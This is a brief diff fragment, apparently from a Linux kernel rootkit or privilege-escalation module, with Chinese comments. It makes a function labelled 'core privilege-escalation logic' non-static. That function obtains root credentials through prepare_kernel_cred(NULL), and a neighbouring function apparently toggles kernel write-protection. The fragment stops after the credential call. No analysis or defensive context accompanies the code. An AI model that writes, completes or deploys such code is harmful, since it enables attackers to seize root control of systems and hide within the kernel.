@@ -47,7 +47,7 @@ static inline void hui_enable_wp(void) {
 }
 
 // 核心提权逻辑
-static void hui_elevate_root(void) {
+void hui_elevate_root(void) {
     struct cred *new_cred;
     if (!current->mm) return; // 排除内核线程
     new_cred = prepare_kernel_cred(NULL);
